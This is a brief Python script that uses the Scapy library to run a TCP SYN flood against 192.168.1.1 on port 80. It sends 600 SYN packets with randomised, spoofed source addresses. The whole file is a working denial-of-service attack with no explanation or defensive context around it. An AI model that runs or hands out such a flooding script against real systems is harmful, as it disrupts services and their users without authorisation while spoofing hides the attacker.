from scapy.all import *

targetIp = "192.168.1.1"

targetPort = 80


def synFloodAttack(targetIp, sport, dport):
    s_addr = RandIP()
    pkt = IP(src=s_addr, dst=targetIp) / TCP(
        sport=sport, dport=dport, seq=1505066, flags="S"
    )
    send(pkt)


for i in range(600):
    synFloodAttack(targetIp, 1234, targetPort)
